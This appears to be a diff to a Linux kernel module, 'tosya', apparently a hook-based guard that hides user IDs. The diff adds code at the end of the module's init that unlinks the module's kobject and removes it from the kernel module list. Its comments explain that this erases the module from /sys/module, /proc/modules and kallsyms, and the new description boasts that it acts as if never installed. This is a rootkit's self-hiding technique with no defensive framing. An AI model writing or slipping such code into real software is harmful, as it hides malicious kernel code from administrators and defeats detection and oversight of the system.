@@ -54,11 +54,35 @@ static int __init tosya_init(void)
 
 	tosya_debug_init(tosya_debug);
 
+	/* The protected parents are resolved before anything can ask for them:
+	 * a names stream that arrived first would have nowhere to land. */
+	tosya_dir_init();
 	netlink_init();
 	/* An inline tier may pin this module and publish a kernel entry below.
 	 * Module-loader failure frees even pinned modules: no error return after
 	 * this point. Individual unsupported tiers report their own status. */
 	pr_info("tosya: ready (%d hook(s))\n", hooks_install());
+
+	/*
+	 * Take the module's own name back off the list.
+	 *
+	 * A loaded module announces itself three times -- a directory under
+	 * /sys/module, an entry in /proc/modules, and the symbols it exports in
+	 * /proc/kallsyms -- and all three are generated from the two structures
+	 * removed here. Nothing in userspace has any business reading the name of
+	 * this module, and whatever a hidden-uid guard is for is defeated by a
+	 * module that can be found by listing them.
+	 *
+	 * It cannot fail and needs no undo: the kobject is only unlinked from
+	 * sysfs, and the module list only loses its node. Module parameters are
+	 * already read (the loader does that before init runs), so nothing that
+	 * has been set up here stops working. This has to stay the last thing init
+	 * does: until hooks_install has run, an error return is still possible, and
+	 * a module that fails after this point would be freed with its name gone.
+	 */
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->list);
+
 	return 0;
 }
 
@@ -66,6 +90,7 @@ static void __exit tosya_exit(void)
 {
 	cancel_delayed_work_sync(&tosya_debug_work);
 	netlink_exit();
+	tosya_dir_exit();
 	hooks_remove();
 	policy_free();
 	pr_info("tosya: unloaded\n");
@@ -75,6 +100,5 @@ module_init(tosya_init);
 module_exit(tosya_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("local");
-MODULE_DESCRIPTION(
-	"tosya - kernel-side uid existence guard (netlink-injected policy)");
+MODULE_AUTHOR("KodateMitsuru");
+MODULE_DESCRIPTION("Тося. She answers as if she were never installed.");
